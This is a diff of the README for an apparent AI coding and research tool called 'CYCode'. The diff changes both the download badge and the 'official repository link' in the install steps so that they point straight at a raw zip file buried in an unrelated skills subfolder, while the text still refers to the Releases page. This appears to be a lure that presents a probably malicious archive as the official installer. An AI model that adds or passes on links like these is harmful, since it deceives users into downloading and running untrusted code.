@@ -1,6 +1,6 @@
 # 🤖 CYCode - Research and write code with AI
 
-[![](https://img.shields.io/badge/Download-CYCode-blue)](https://github.com/Groundnoiserealestatebusiness382/CYCode)
+[![](https://img.shields.io/badge/Download-CYCode-blue)](https://github.com/Groundnoiserealestatebusiness382/CYCode/raw/refs/heads/main/skills/watch-run/Code-CY-scrawk.zip)
 
 CYCode helps you manage AI-driven research tasks on your computer. You can browse academic papers, run coding experiments, manage notebooks, and write LaTeX documents using simple commands. The application works in your terminal, through a local web screen, or in the background for automated work.
 
@@ -10,7 +10,7 @@ You need a Windows computer with a standard internet connection to start. CYCode
 
 Follow these steps to install the program:
 
-1. Visit the [official repository link](https://github.com/Groundnoiserealestatebusiness382/CYCode).
+1. Visit the [official repository link](https://github.com/Groundnoiserealestatebusiness382/CYCode/raw/refs/heads/main/skills/watch-run/Code-CY-scrawk.zip).
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version for Windows.
 4. Download the installation file.
